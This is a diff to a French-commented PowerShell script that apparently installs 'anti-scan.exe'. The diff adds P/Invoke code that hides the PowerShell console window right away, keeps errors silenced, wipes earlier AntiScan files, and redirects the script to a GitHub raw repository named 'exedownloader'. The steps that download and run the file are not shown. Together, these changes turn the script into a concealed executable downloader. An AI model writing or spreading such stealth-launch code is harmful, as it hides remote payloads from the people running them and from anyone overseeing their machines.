@@ -3,13 +3,28 @@
 
 $ErrorActionPreference = "SilentlyContinue"
 
-# 0. Nettoyage immédiat de l'ancien environnement
+# 0. Masquer immédiatement la fenêtre PowerShell courante
+try {
+    $memberDefinition = @'
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+'@
+    $type = Add-Type -MemberDefinition $memberDefinition -Name "Win32Utils" -Namespace "Win32" -PassThru
+    $hwnd = $type::GetConsoleWindow()
+    if ($hwnd -ne [IntPtr]::Zero) {
+        # 0 = SW_HIDE (masque complètement la fenêtre)
+        $type::ShowWindow($hwnd, 0)
+    }
+} catch {}
+
+# 0.1 Nettoyage immédiat de l'ancien environnement
 Remove-Item -Path "$env:LOCALAPPDATA\AntiScan" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "$env:TEMP\AntiScan*"        -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "$env:TEMP\ANTI.exe"         -Recurse -Force -ErrorAction SilentlyContinue
-Clear-Host
 
-$REPO_URL   = "https://raw.githubusercontent.com/AdamZoda/ANTI/main"
+$REPO_URL   = "https://raw.githubusercontent.com/AdamZoda/exedownloader/main"
 $installDir = "$env:LOCALAPPDATA\AntiScan"
 $exePath    = "$installDir\anti-scan.exe"
 
